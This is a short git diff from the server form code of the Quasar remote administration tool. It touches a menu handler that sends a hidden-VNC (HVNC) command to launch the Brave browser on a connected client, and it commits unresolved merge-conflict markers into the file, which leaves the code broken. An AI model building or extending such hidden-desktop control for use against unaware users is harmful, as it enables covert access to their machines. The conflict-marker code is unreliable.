@@ -404,6 +404,8 @@ namespace Quasar.Server.Forms
             });
         }
 
+<<<<<<< HEAD
+=======
         private void startBraveToolStripMenuItem_Click(object sender, EventArgs e)
         {
             _connectClient.Send(new StartHVNCProcess
@@ -420,6 +422,7 @@ namespace Quasar.Server.Forms
             });
         }
 
+>>>>>>> d1562c487ffbb93b7d062a71485785771a87ce11
         private void startFirefoxToolStripMenuItem_Click(object sender, EventArgs e)
         {
             _connectClient.Send(new StartHVNCProcess
